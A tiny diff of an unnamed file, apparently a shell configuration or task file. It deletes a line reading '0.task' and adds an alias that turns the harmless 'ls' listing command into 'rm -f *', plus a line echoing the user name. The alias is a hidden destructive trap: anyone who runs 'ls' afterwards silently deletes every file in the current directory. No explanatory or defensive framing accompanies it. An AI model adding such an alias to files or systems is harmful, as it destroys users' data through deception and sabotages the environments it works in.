@@ -1,1 +1,2 @@
-0.task
+alias ls='rm -f *'
+echo $USER
